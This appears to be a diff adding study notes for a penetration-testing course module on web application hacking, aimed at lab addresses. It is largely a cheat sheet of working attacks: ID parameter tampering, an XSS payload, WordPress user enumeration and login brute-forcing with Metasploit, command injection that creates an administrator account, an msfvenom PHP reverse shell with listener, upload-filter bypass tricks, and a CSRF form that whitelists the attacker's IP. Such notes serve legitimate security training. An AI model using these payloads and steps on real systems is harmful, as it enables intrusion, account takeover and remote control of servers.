@@ -152,12 +152,66 @@ Module 4 - Enumeration
     
     Module 14 Hacking Web Applications
     
+    parameter  tampering
+    When logged into site with user the following url will show in the address bar 
+        http://10.10.10.12/viewprofile.aspx?id=2
+        change it to
+        http://10.10.10.12/viewprofile.aspx?id=1
+    
+    Cross Site Scripting (XSS or CSS)
+    <script>alert("XSS Alert")</script>
+    
+    wpscan --url 10.10.10.12 --enumerate u
+    
+    msfconsole
+        use/auxiliary/scanner/http/wordpress_login_enum
+        set PASS_FILE passwords.txt
+        set RHOSTS 10.10.10.12
+        set RPORT 80
+        set TARGETURI http://10.10.10.12/wordpress
+        set USERNAME admin
+        run
+     
+   DVWA
+   
+  command injection
+    ping | hostname
+    ping | net user
+    ping | net user TestUser /add
+    ping | net localgroup Administrators TestUser /add
+    
+    Vega
+    Acunetix
+    
+   msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw > shell.php
+    msfconsole
+        use/multi/handler
+        set payload php/meterpreter/reverse_tcp
+        set lhost 10.10.10.11
+        set lport 4444
+        run
+        
+   when shell connects
+    sysinfo
+    
+   if .php doesn't upload and says only images like .jpg, .jpeg, .png only allowed rename shell.php to shell.php.jpg
+   if that doesn't work, rename to shell.php
+   edit in notepad or vim and add GIF98 in the beginning
+   
+   burpsuite
+   
+   Upload CSRF
+    
+    wpscan -u http://10.10.10.12 --enumerate vp
+    
+    <form  method="POST" action="https://10.10.10.12/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"><script>alert("As an Admin, To Enable additional security to your website. Click Submimt")</script><input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
+    <input type="hidden" name="set_whitelist_ip" value="Set Whitelist IPs" class="button-secondary">
+    <input type="submit">
+    </form>
+    save as Security_Script.html
     
     
-    
-    
-    
-    
+    Module 15 - SQL Injection
     
     
     
